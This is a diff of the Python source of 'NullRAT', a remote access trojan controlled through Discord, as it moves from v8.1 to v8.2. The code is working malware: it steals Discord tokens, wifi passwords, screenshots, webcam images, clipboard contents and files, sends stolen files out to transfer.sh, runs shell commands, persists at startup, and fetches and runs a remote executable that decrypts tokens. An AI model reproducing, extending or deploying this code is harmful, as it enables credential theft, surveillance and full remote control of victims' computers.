@@ -11,27 +11,30 @@ from base64 import decodebytes,b64decode
 from socket import create_connection
 import os, subprocess, re, time, aiohttp
 
-client, original_dir = commands.Bot(), os.getcwd()
+client, original_dir = commands.InteractionBot(test_guilds=server_ids), os.getcwd()
 nr_working = f"C:\\Users\\{os.getenv('username')}\\Music"
 
 @client.event
 async def on_ready():
     await client.get_channel(notification_channel).send(
-        embed=Embed(title = f"NullRAT v8.1 started on {IP()}\nCurrently present in {original_dir}")
+        embed=Embed(title = f"NullRAT v8.2 started on {IP()}\nCurrently present in {original_dir}")
     )
 
 # Intelligence Gathering #
-@client.slash_command(description="Finds the IP address of victims", guild_ids=server_ids)
+@client.slash_command(description="Finds the IP address of victims")
 async def getip(ctx):
     await ctx.channel.send(
         embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA)
     )
     await ctx.response.send_message("Checking all available victims...")
 
-@client.slash_command(description="Finds the values of environment variables", guild_ids=server_ids)
-async def getenv(ctx, victim, env_var):
+@client.slash_command(description="Finds the values of environment variables")
+async def get_environment(ctx, victim, env_var):
     if str(victim) == str(IP()):
-        value = os.getenv(env_var)
+        try: value = os.getenv(env_var)
+        except: return await ctx.response.send_message(embed=discord.Embed(title="Invalid environment variable!",color=0x0081FA))
+        if value is None:
+            return await ctx.response.send_message(embed=discord.Embed(title="Invalid environment variable!",color=0x0081FA))
         if len(value) >= 1023:
             return await ctx.response.send_message(f"The value for {env_var} is:\n```{value}```")
         await ctx.response.send_message(
@@ -42,7 +45,7 @@ async def getenv(ctx, victim, env_var):
             )
         )
 
-@client.slash_command(description="Finds all geolocation information of victim", guild_ids=server_ids)
+@client.slash_command(description="Finds all geolocation information of victim")
 async def geolocate(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
@@ -58,12 +61,12 @@ async def geolocate(ctx, victim):
         embed.add_field(name="Longitude", value=data["lon"], inline=True)
         embed.add_field(name="Zip code", value=data["zip"], inline=True)
         embed.add_field(name="ISP", value=data["isp"], inline=True)
-        embed.set_footer(text="Written by NullCode1337#1638")
+        embed.set_footer(text="Written by NullCode1337")
         await ctx.followup.send(embed=embed)
     # else: await ctx.response.send_message("aaa")
 
-@client.slash_command(description="Capture image from webcam", guild_ids=server_ids)  
-async def webcam(ctx, victim):
+@client.slash_command(description="Capture image from webcam")  
+async def webcam_image(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         webcam = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64").text, "utf-8")
@@ -71,15 +74,15 @@ async def webcam(ctx, victim):
         with open("cc.exe", "wb") as fh: fh.write(decodebytes(webcam))
         subprocess.run("cc.exe & ren image.bmp image.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         await ctx.followup.send(
-            embed=discord.Embed(title="Here is the photo:", color=0x0081FA), 
+            embed=discord.Embed(title="Snapshot taken from webcam:", color=0x0081FA), 
             file=discord.File(nr_working + "\\image.png")
         )
         os.remove(nr_working + "\\image.png")
         os.remove(nr_working + "\\cc.exe")
         os.chdir(original_dir)   
   
-@client.slash_command(description="Sends General System Information", guild_ids=server_ids)
-async def gsl(ctx, victim):
+@client.slash_command(description="Sends General System Information")
+async def systeminfo(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         subprocess.run(
@@ -90,54 +93,58 @@ async def gsl(ctx, victim):
             stdin=subprocess.PIPE,
         )
         await ctx.followup.send(
-            "Here is the file", 
+            embed=discord.Embed(title="General System Info:", color=0x0081FA), 
             file=discord.File(nr_working + "\\youtube.txt", filename="General Output.txt"), 
         )
         os.remove(nr_working + "\\youtube.txt")
 
-@client.slash_command(description="Sends screenshot of entire monitor", guild_ids=server_ids)
+@client.slash_command(description="Sends screenshot of entire monitor")
 async def screenshot(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         with mss() as sct: sct.shot(output=nr_working+"\\monitor.png")
         file = discord.File(nr_working + "\\monitor.png")
-        await ctx.followup.send(file=file)
+        await ctx.followup.send(
+            embed=discord.Embed(title="Screenshot of victim's PC:", color=0x0081FA), 
+            file=file
+        )
         time.sleep(2)
         os.remove(nr_working + "\\monitor.png")
 
-@client.slash_command(description="Sends text contents of clipboard", guild_ids=server_ids)
+@client.slash_command(description="Sends text contents of clipboard")
 async def clipboard(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         outp = os.popen("powershell Get-Clipboard").read()
         await ctx.followup.send(f"```{outp}```" if outp != "" else "No text in clipboard!")
 
-@client.slash_command(description="Sends raw Discord Tokens (fast)", guild_ids=server_ids)
+@client.slash_command(description="Sends raw Discord Tokens (fast)")
 async def raw_tokens(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
-        message, tokens = "", list(dict.fromkeys(find_token()))
+        message, tokens = "", find_token()
         for token in tokens: 
             message += token + "\n"
         if len(message) >= 1023: 
             return await ctx.followup.send("```" + message + "```")
         embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
+        embed.set_footer(text="Written by NullCode1337")
         await ctx.followup.send(embed=embed)
 
-@client.slash_command(description="Sends checked tokens along with info (accurate)", guild_ids=server_ids)
+@client.slash_command(description="Sends checked tokens along with info (accurate)")
 async def checked_tokens(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []
 
-        for token in list(dict.fromkeys(find_token())):
+        for token in find_token():
             headers = {'Authorization': token, 'Content-Type': 'application/json'}
             requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)
 
             if requ.status_code == 401: continue
             if requ.status_code == 200:
-                json = requ.json()
                 valid.append( str(token) )
+                json = requ.json()
                 email.append( str(json['email']) )
                 phone.append( str(json['phone']) ) 
                 idq.append(   str(json["id"])   )            
@@ -152,27 +159,94 @@ async def checked_tokens(ctx, victim):
         await ctx.followup.send("Checking all tokens...")
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
             await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
-                
+
+@client.slash_command(description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens")
+async def discord_tokens(ctx, victim):
+    if str(victim) == str(IP()):
+        import os
+        await ctx.response.defer()
+        try:
+            tkr = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
+            await ctx.channel.send("Status:\n> Downloaded custom decryptor")
+        except Exception as e:
+            return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
+            
+        os.chdir(nr_working)
+        
+        with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
+        await ctx.channel.send("> Prepared custom decryptor")
+        discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
+        await ctx.channel.send("> Attempted to decrypt tokens from discord...")
+        
+        msg = "Done!\n```"
+        for a in discord_tokenz:
+            msg += a + "\n"
+        msg += "```"
+        await ctx.followup.send(msg)
+        os.remove(nr_working + "\\tkr.exe")
+        os.chdir(original_dir)   
+
+@client.slash_command(description="[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens")
+async def discord_checked(ctx, victim):
+    if str(victim) == str(IP()):
+        import os
+        await ctx.response.defer()
+        try:
+            tkr = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
+        except Exception as e:
+            return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
+            
+        os.chdir(nr_working)
+        with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
+        discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
+        
+        valid, email, phone, uname, nitro, bill, avatar, tks, idq = [], [], [], [], [], [], [], [], []
+        for a in discord_tokenz: tks.append(a.replace('"',''))
+        for token in tks:
+            headers = {'Authorization': token, 'Content-Type': 'application/json'}
+            requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)
+                        
+            if requ.status_code == 401: 
+                await ctx.channel.send(embed=discord.Embed(title="Token is invalid!",description=token))
+                continue
+            if requ.status_code == 200:
+                valid.append( str(token) )
+                json = requ.json()
+                email.append( str(json['email']) )
+                phone.append( str(json['phone']) ) 
+                idq.append(   str(json["id"])   )            
+                uname.append( f'{json["username"]}#{json["discriminator"]}' )
+                avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
+                nitro.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
+                bill.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
+                continue
+
+        if len(valid) == 0: 
+            return await ctx.followup.send(embed = Embed(title="No valid Discord Tokens"))
+        await ctx.followup.send("Checking all tokens...")
+        for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
+            await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
+        
 # Directory Manipulation #
-@client.slash_command(description="Returns Current Working Directory", guild_ids=server_ids)
-async def getcwd(ctx, victim):
+@client.slash_command(description="Returns Current Working Directory")
+async def get_workingdir(ctx, victim):
     if str(victim) == str(IP()):
        await ctx.response.send_message(embed=EmbedGen("Current directory", "The present directory is: ", f"```{os.getcwd()}```"))
     
-@client.slash_command(description="Uploads file to victim's PC", guild_ids=server_ids)
-async def upload(ctx, victim, url, file_name, file_path=nr_working):
+@client.slash_command(description="Send file to victim's PC")
+async def sendfiles(ctx, victim, url, file_name, file_path=nr_working):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         if '"' in file_path:
             file_path = file_path.replace('"','')
         try: os.chdir(file_path)
-        except: return await ctx.followup.send("invalid dir")
+        except: return await ctx.followup.send("Invalid directory!")
         r = get(url, allow_redirects=True)
         with open(file_name, "wb") as f: f.write(r.content)
         await ctx.followup.send(embed=EmbedGen("Upload information", "Sending file to victim: ", "Success"))
 
-@client.slash_command(description="Downloads file from victim's PC", guild_ids=server_ids)
-async def download(ctx, victim, file):
+@client.slash_command(description="Receives file from victim's PC")
+async def receivefiles(ctx, victim, file):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         if '"' in file:
@@ -182,9 +256,11 @@ async def download(ctx, victim, file):
         file = {'{}'.format(file): f}
         response = post('https://transfer.sh/', files=file)
         download_link = response.content.decode('utf-8')
-        return await ctx.followup.send("Done! Link is: " + download_link)
+        embed=discord.Embed(title="Download Inforation", description="Receiving file from victim: Success")
+        embed.add_field(name="Download link is:", value="download_link")
+        return await ctx.followup.send(embed=embed)
 
-@client.slash_command(description="Change directory to specified location", guild_ids=server_ids)
+@client.slash_command(description="Change directory to specified location")
 async def change_directory(ctx, victim, directory):
     if str(victim) == str(IP()):
         try:
@@ -193,8 +269,8 @@ async def change_directory(ctx, victim, directory):
         except FileNotFoundError:
             await ctx.response.send_message(embed=EmbedGen("CD information", "Changing directory failed!", "```Error: Incorrect Path```"))
 
-@client.slash_command(description="Finds contents of directory", guild_ids=server_ids)
-async def listdir(ctx, victim, directory_to_find="null"):
+@client.slash_command(description="Finds contents of directory")
+async def list_directory(ctx, victim, directory_to_find="null"):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         if directory_to_find == "null":
@@ -208,12 +284,13 @@ async def listdir(ctx, victim, directory_to_find="null"):
         file = discord.File(
             os.path.join(nr_working + "\\dir.txt"), filename="Directory.txt"
         )
-        await ctx.followup.send("Contents of dir " + directory_to_find + " are:", file=file)
+        embed=discord.Embed(title="Contents of directory are:", description=directory_to_find)
+        await ctx.followup.send(embed=embed, file=file)
         os.remove(nr_working + "\\dir.txt")
         os.chdir(original_dir)
 
 # Misc. Commands #
-@client.slash_command(description="Add NullRAT to startup directory", guild_ids=server_ids)
+@client.slash_command(description="Add NullRAT to startup directory")
 async def startup(ctx, victim):
     if str(victim) == str(IP()):
         from sys import executable; msg = "```\n"
@@ -225,8 +302,8 @@ async def startup(ctx, victim):
         for value in os.listdir(): msg += f'{value}\n'
         msg += "```"; await ctx.followup.send(msg, embed=Embed(title="If you see the program here, you're good to go: ", color=0x0081FA))
 
-@client.slash_command(description="Executes shell commands", guild_ids=server_ids)
-async def shell(ctx, msg, victim): 
+@client.slash_command(description="Executes shell commands")
+async def shell(ctx, victim, msg): 
     if str(victim) == str(IP()):
         await ctx.response.defer()
         global status; status = None
@@ -261,19 +338,19 @@ async def shell(ctx, msg, victim):
             )
             status = None
 
-@client.slash_command(description="Lists all wifi networks", guild_ids=server_ids)
+@client.slash_command(description="Lists all wifi networks")
 async def wifilist(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.send_message(f"```{os.popen('netsh wlan show profiles').read().replace('All', '').replace('Profile', 'Network')}```")
 
-@client.slash_command(description="Lists specified wifi password", guild_ids=server_ids)
+@client.slash_command(description="Lists specified wifi password")
 async def wifipass(ctx, victim, name):
     if str(victim) == str(IP()):
         a = os.popen('netsh wlan show profile '+'"'+name.lstrip().rstrip()+'" '+"key=clear | findstr Key")
         await ctx.response.send_message(f"```{a.read()}```")
         
-@client.slash_command(description="Hide file", guild_ids=server_ids)
-async def hide(ctx, victim, file):
+@client.slash_command(description="Hide file")
+async def hidefile(ctx, victim, file):
     if str(victim) == str(IP()): 
         if '"' in file:
             file = file.replace('"','')
@@ -282,8 +359,8 @@ async def hide(ctx, victim, file):
         
         await ctx.response.send_message("File hidden successfully")
                     
-@client.slash_command(description="Unhide file", guild_ids=server_ids)
-async def unhide(ctx, victim, file):
+@client.slash_command(description="Unhide file")
+async def unhidefile(ctx, victim, file):
     if str(victim) == str(IP()): 
         if '"' in file:
             file = file.replace('"','')
@@ -292,7 +369,7 @@ async def unhide(ctx, victim, file):
         
         await ctx.response.send_message("File unhidden successfully")
             
-@client.slash_command(description="Quits NullRAT from specified IP", guild_ids=server_ids)
+@client.slash_command(description="Quits NullRAT from specified IP")
 async def close(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.send_message(embed=EmbedGen("Information", "Given IP is " + IP(), "Closing NullRAT..."))
@@ -300,7 +377,7 @@ async def close(ctx, victim):
     if "." not in ip:
         return await ctx.response.send_message(embed=EmbedGen("Information", "Given IP is incorrect!", "Please try again"))  
         
-@client.slash_command(description="Quits all instances of NullRAT", guild_ids=server_ids)
+@client.slash_command(description="Quits all instances of NullRAT")
 async def close_all(ctx):
     await ctx.response.send_message("Are you sure?", view=closeall_confirm())
       
@@ -333,15 +410,14 @@ def EmbedGen(title_main, name, value):
     color = 0x0081FA
     embed = Embed(title=title_main, color=color)
     embed.add_field(name=name, value=value)
-    embed.set_footer(text="Written by NullCode1337#1638")
+    embed.set_footer(text="Written by NullCode1337")
     return embed
 
 def find_token():
     tokens = tokens2 = []
     local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
     paths = {
-        "Discord": roaming + "\\Discord",                                "Discord Canary": roaming + "\\discordcanary",
-        "Discord PTB": roaming + "\\discordptb",                         "Lightcord": roaming + "\\Lightcord",
+        "Lightcord": roaming + "\\Lightcord",
         "Opera": roaming + "\\Opera Software\\Opera Stable",             "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
         "Chrome": local + "\\Google\\Chrome\\User Data\\Default",        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
         "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
@@ -354,7 +430,7 @@ def find_token():
                 if not file_name.endswith('.log') and not file_name.endswith('.ldb'): 
                     continue
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"):
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                         for token in re.findall(regex, line): 
                             tokens.append(token)
         except FileNotFoundError: continue
